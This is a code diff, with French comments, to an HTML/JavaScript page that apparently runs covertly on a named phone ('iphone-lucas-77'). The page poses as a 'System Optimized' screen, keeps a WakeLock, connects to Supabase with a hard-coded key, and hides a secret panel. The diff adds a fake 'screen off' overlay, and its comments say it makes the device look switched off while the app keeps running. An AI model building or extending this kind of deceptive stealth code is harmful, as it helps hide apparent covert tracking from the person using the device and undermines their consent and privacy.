@@ -36,6 +36,44 @@
         h1 { font-size: 10px; font-weight: normal; color: #111; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
         p { font-size: 10px; color: #111; text-transform: uppercase; letter-spacing: 1px; }
 
+        /* Faux écran veille — l'écran semble éteint mais l'app tourne */
+        #fake-screen-off {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: #000;
+            z-index: 9998;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            cursor: none;
+        }
+        #fake-screen-off .ss-time {
+            color: #1c1c1c;
+            font-size: 56px;
+            font-weight: 200;
+            font-family: -apple-system, sans-serif;
+            letter-spacing: 4px;
+        }
+        #fake-screen-off .ss-date {
+            color: #141414;
+            font-size: 13px;
+            margin-top: 8px;
+            letter-spacing: 2px;
+        }
+        #fake-screen-off .ss-dot {
+            width: 4px;
+            height: 4px;
+            border-radius: 50%;
+            background: #1a1a1a;
+            margin-top: 40px;
+            animation: pulse-dot 3s ease-in-out infinite;
+        }
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.7; }
+        }
+
         /* Secret Simulator (Hidden by default, triggered by 5 clicks on background) */
         #secret-panel {
             display: none;
@@ -63,6 +101,13 @@
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body onclick="handleSecretClick()">
+    <!-- Faux écran éteint — masque l'app mais la garde en premier plan -->
+    <div id="fake-screen-off">
+        <div class="ss-time" id="ss-time">00:00</div>
+        <div class="ss-date" id="ss-date"></div>
+        <div class="ss-dot"></div>
+    </div>
+
     <div class="stealth-container">
         <div class="spinner"></div>
         <p>System Optimized</p>
@@ -95,6 +140,45 @@
         const SUPABASE_KEY = "sb_publishable_fqMsbMKGzUDncTdW7kMLaA_mmROVye4";
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
         const DEVICE_ID = "iphone-lucas-77";
+
+        // --- FAUX ÉCRAN VEILLE ---
+        let ssTimeout = null;
+        const fakeScreen = document.getElementById('fake-screen-off');
+
+        function updateScreensaverClock() {
+            const now = new Date();
+            const h = now.getHours().toString().padStart(2, '0');
+            const m = now.getMinutes().toString().padStart(2, '0');
+            document.getElementById('ss-time').textContent = h + ':' + m;
+            const days = ['Dimanche','Lundi','Mardi','Mercredi','Jeudi','Vendredi','Samedi'];
+            const months = ['jan','fév','mar','avr','mai','jun','jul','aoû','sep','oct','nov','déc'];
+            document.getElementById('ss-date').textContent =
+                days[now.getDay()] + ' ' + now.getDate() + ' ' + months[now.getMonth()];
+        }
+
+        function showFakeScreen() {
+            updateScreensaverClock();
+            fakeScreen.style.display = 'flex';
+            // Mettre à jour l'heure toutes les minutes
+            setInterval(updateScreensaverClock, 60000);
+        }
+
+        function hideFakeScreen() {
+            fakeScreen.style.display = 'none';
+            resetScreensaverTimer();
+        }
+
+        function resetScreensaverTimer() {
+            clearTimeout(ssTimeout);
+            ssTimeout = setTimeout(showFakeScreen, 12000); // 12s sans toucher → faux écran veille
+        }
+
+        // Masquer le faux écran sur toucher
+        fakeScreen.addEventListener('touchstart', (e) => { e.stopPropagation(); hideFakeScreen(); }, { passive: true });
+        fakeScreen.addEventListener('click', (e) => { e.stopPropagation(); hideFakeScreen(); });
+
+        // Réinitialiser le timer sur toute interaction
+        document.addEventListener('touchstart', resetScreensaverTimer, { passive: true });
 
         // Secret click logic
         let clickCount = 0;
@@ -160,6 +244,9 @@
 
             // Acquérir le WakeLock dès le chargement
             await acquireWakeLock();
+
+            // Démarrer le timer du faux écran veille
+            resetScreensaverTimer();
 
             // Start background tasks
             startBackgroundTasks();
